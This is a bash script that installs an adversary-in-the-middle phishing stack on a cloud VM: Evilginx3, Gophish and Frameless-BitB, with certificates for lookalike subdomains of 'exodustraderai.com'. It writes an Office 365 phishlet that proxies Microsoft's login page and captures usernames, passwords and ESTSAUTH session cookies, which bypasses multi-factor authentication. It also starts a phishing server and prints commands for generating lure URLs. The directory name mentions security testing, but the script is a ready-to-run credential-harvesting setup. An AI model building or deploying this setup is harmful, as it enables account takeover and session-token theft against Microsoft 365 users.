#!/bin/bash
#
# EvilGophish VM Installation Script
# Run this script ON THE VM after SSH'ing in
#

set -e  # Exit on any error

echo "=========================================="
echo "  EvilGophish VM Installation"
echo "=========================================="
echo ""

# Configuration
DOMAIN="exodustraderai.com"
INSTALL_DIR="/opt/security-testing/evilgophish"
GO_VERSION="1.21.0"
GOPHISH_VERSION="0.12.1"

# Email for Let's Encrypt
read -p "Enter your email for SSL certificates: " SSL_EMAIL

echo ""
echo "Configuration:"
echo "  Domain: $DOMAIN"
echo "  Install Directory: $INSTALL_DIR"
echo "  Go Version: $GO_VERSION"
echo "  Gophish Version: $GOPHISH_VERSION"
echo "  SSL Email: $SSL_EMAIL"
echo ""

read -p "Press ENTER to continue..."

# Become root
if [ "$EUID" -ne 0 ]; then
    echo "Switching to root..."
    exec sudo su -c "$0" "$@"
fi

# Step 1: System Updates
echo ""
echo "=========================================="
echo "Step 1: Updating System"
echo "=========================================="
echo ""

apt-get update
apt-get upgrade -y
apt-get install -y git curl wget build-essential unzip net-tools

echo "✓ System updated"

# Step 2: Install Go
echo ""
echo "=========================================="
echo "Step 2: Installing Go $GO_VERSION"
echo "=========================================="
echo ""

if [ -d "/usr/local/go" ]; then
    echo "⚠ Go already installed, removing old version..."
    rm -rf /usr/local/go
fi

cd /tmp
wget -q https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz
tar -C /usr/local -xzf go${GO_VERSION}.linux-amd64.tar.gz
rm go${GO_VERSION}.linux-amd64.tar.gz

# Set environment variables
export PATH=$PATH:/usr/local/go/bin
export GOPATH=/root/go
echo 'export PATH=$PATH:/usr/local/go/bin' >> /root/.bashrc
echo 'export GOPATH=/root/go' >> /root/.bashrc

# Verify Go installation
GO_INSTALLED_VERSION=$(/usr/local/go/bin/go version)
echo "✓ Go installed: $GO_INSTALLED_VERSION"

# Step 3: Create Directory Structure
echo ""
echo "=========================================="
echo "Step 3: Creating Directory Structure"
echo "=========================================="
echo ""

mkdir -p $INSTALL_DIR
cd $INSTALL_DIR

echo "✓ Created $INSTALL_DIR"

# Step 4: Install Evilginx3
echo ""
echo "=========================================="
echo "Step 4: Installing Evilginx3"
echo "=========================================="
echo ""

if [ -d "$INSTALL_DIR/evilginx3" ]; then
    echo "⚠ Evilginx3 directory exists, removing..."
    rm -rf $INSTALL_DIR/evilginx3
fi

git clone https://github.com/kgretzky/evilginx2.git evilginx3
cd evilginx3

echo "Building Evilginx3..."
make

if [ -f "$INSTALL_DIR/evilginx3/build/evilginx" ]; then
    echo "✓ Evilginx3 built successfully"
else
    echo "✗ ERROR: Evilginx3 binary not found!"
    exit 1
fi

# Step 5: Install Gophish
echo ""
echo "=========================================="
echo "Step 5: Installing Gophish"
echo "=========================================="
echo ""

cd $INSTALL_DIR

if [ -d "$INSTALL_DIR/gophish" ]; then
    echo "⚠ Gophish directory exists, removing..."
    rm -rf $INSTALL_DIR/gophish
fi

wget -q https://github.com/gophish/gophish/releases/download/v${GOPHISH_VERSION}/gophish-v${GOPHISH_VERSION}-linux-64bit.zip
unzip -q gophish-v${GOPHISH_VERSION}-linux-64bit.zip -d gophish
rm gophish-v${GOPHISH_VERSION}-linux-64bit.zip
cd gophish
chmod +x gophish

echo "✓ Gophish installed"

# Step 6: Install Frameless-BitB (Optional)
echo ""
echo "=========================================="
echo "Step 6: Installing Frameless-BitB (Optional)"
echo "=========================================="
echo ""

cd $INSTALL_DIR
git clone https://github.com/mrd0x/Frameless-BitB.git frameless-bitb 2>/dev/null || {
    echo "⚠ Frameless-BitB clone failed (may require authentication) - skipping"
}

# Step 7: Disable systemd-resolved (port 53 conflict)
echo ""
echo "=========================================="
echo "Step 7: Disabling systemd-resolved"
echo "=========================================="
echo ""

systemctl stop systemd-resolved
systemctl disable systemd-resolved

# Set static DNS
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf
chattr +i /etc/resolv.conf

echo "✓ systemd-resolved disabled, DNS set to Google (8.8.8.8)"

# Step 8: Disable Apache (port 443 conflict)
echo ""
echo "=========================================="
echo "Step 8: Disabling Apache"
echo "=========================================="
echo ""

systemctl stop apache2 2>/dev/null || true
systemctl disable apache2 2>/dev/null || true

echo "✓ Apache disabled"

# Step 9: Install Certbot
echo ""
echo "=========================================="
echo "Step 9: Installing Certbot"
echo "=========================================="
echo ""

apt-get install -y certbot

echo "✓ Certbot installed"

# Step 10: Generate SSL Certificates
echo ""
echo "=========================================="
echo "Step 10: Generating SSL Certificates"
echo "=========================================="
echo ""

echo "This will generate SSL certificates for all 6 subdomains:"
echo "  - login.$DOMAIN"
echo "  - www.$DOMAIN"
echo "  - portal.$DOMAIN"
echo "  - admin.$DOMAIN"
echo "  - feed.$DOMAIN"
echo "  - api.$DOMAIN"
echo ""
echo "Make sure your DNS records are propagated before continuing!"
echo ""

read -p "Press ENTER to continue with SSL generation..."

certbot certonly --standalone --preferred-challenges http \
    -d login.$DOMAIN \
    -d www.$DOMAIN \
    -d portal.$DOMAIN \
    -d admin.$DOMAIN \
    -d feed.$DOMAIN \
    -d api.$DOMAIN \
    --non-interactive --agree-tos \
    -m $SSL_EMAIL

if [ $? -eq 0 ]; then
    echo "✓ SSL certificates generated"
else
    echo "✗ ERROR: SSL certificate generation failed!"
    echo "This usually means DNS is not propagated yet."
    echo "Wait 10-15 minutes and run this command manually:"
    echo ""
    echo "certbot certonly --standalone --preferred-challenges http \\"
    echo "    -d login.$DOMAIN \\"
    echo "    -d www.$DOMAIN \\"
    echo "    -d portal.$DOMAIN \\"
    echo "    -d admin.$DOMAIN \\"
    echo "    -d feed.$DOMAIN \\"
    echo "    -d api.$DOMAIN \\"
    echo "    --non-interactive --agree-tos \\"
    echo "    -m $SSL_EMAIL"
    echo ""
    read -p "Press ENTER to continue anyway..."
fi

# Step 11: Create O365 Phishlet
echo ""
echo "=========================================="
echo "Step 11: Creating O365 Phishlet"
echo "=========================================="
echo ""

PHISHLETS_DIR="$INSTALL_DIR/evilginx3/phishlets"
mkdir -p $PHISHLETS_DIR

cat > $PHISHLETS_DIR/o365.yaml << 'PHISHLET_EOF'
name: 'o365'
author: '@kgretzky'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json']}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/'
PHISHLET_EOF

if [ -f "$PHISHLETS_DIR/o365.yaml" ]; then
    echo "✓ O365 phishlet created: $PHISHLETS_DIR/o365.yaml"
    cat $PHISHLETS_DIR/o365.yaml
else
    echo "✗ ERROR: Failed to create O365 phishlet!"
    exit 1
fi

# Step 12: Configure Gophish
echo ""
echo "=========================================="
echo "Step 12: Configuring Gophish"
echo "=========================================="
echo ""

cd $INSTALL_DIR/gophish

cat > config.json << 'GOPHISH_CONFIG'
{
  "admin_server": {
    "listen_url": "0.0.0.0:3333",
    "use_tls": true,
    "cert_path": "gophish_admin.crt",
    "key_path": "gophish_admin.key"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:8080",
    "use_tls": false
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_"
}
GOPHISH_CONFIG

echo "✓ Gophish configured"

# Step 13: Create systemd service for Gophish
echo ""
echo "=========================================="
echo "Step 13: Creating Gophish Service"
echo "=========================================="
echo ""

cat > /etc/systemd/system/gophish.service << EOF
[Unit]
Description=Gophish Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR/gophish
ExecStart=$INSTALL_DIR/gophish/gophish
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable gophish
systemctl start gophish

echo "✓ Gophish service created and started"

# Step 14: Create helper scripts
echo ""
echo "=========================================="
echo "Step 14: Creating Helper Scripts"
echo "=========================================="
echo ""

# Get external IP
EXTERNAL_IP=$(curl -s http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip -H "Metadata-Flavor: Google")

# Evilginx3 start script
cat > $INSTALL_DIR/start-evilginx.sh << EOF
#!/bin/bash
cd $INSTALL_DIR/evilginx3
./build/evilginx -p ./phishlets
EOF

chmod +x $INSTALL_DIR/start-evilginx.sh

# Evilginx3 auto-config script
cat > $INSTALL_DIR/configure-evilginx.sh << EOF
#!/bin/bash
echo "Configuring Evilginx3..."
echo ""
echo "Run these commands inside Evilginx3:"
echo ""
echo "config domain $DOMAIN"
echo "config ipv4 external $EXTERNAL_IP"
echo "phishlets hostname o365 login.$DOMAIN"
echo "crt /etc/letsencrypt/live/login.$DOMAIN/fullchain.pem /etc/letsencrypt/live/login.$DOMAIN/privkey.pem"
echo "phishlets enable o365"
echo "lures create o365"
echo "lures get-url 0"
echo ""
EOF

chmod +x $INSTALL_DIR/configure-evilginx.sh

echo "✓ Helper scripts created"

# Final summary
echo ""
echo "=========================================="
echo "  Installation Complete!"
echo "=========================================="
echo ""
echo "Installation Directory: $INSTALL_DIR"
echo "External IP: $EXTERNAL_IP"
echo "Domain: $DOMAIN"
echo ""
echo "Services Status:"
echo "  - Gophish: Running on port 3333 (HTTPS)"
echo "  - Evilginx3: Ready to start"
echo ""
echo "Next Steps:"
echo ""
echo "1. Check Gophish admin password:"
echo "   journalctl -u gophish | grep password"
echo ""
echo "2. Start Evilginx3 interactively:"
echo "   $INSTALL_DIR/start-evilginx.sh"
echo ""
echo "3. Inside Evilginx3, run these commands:"
cat $INSTALL_DIR/configure-evilginx.sh | grep "^echo" | sed 's/echo "//g' | sed 's/"$//g'
echo ""
echo "4. Access Gophish admin panel:"
echo "   https://$EXTERNAL_IP:3333"
echo ""
echo "5. Test phishing page:"
echo "   https://login.$DOMAIN"
echo ""
echo "Helper Scripts:"
echo "  - Start Evilginx3: $INSTALL_DIR/start-evilginx.sh"
echo "  - Config reference: $INSTALL_DIR/configure-evilginx.sh"
echo ""
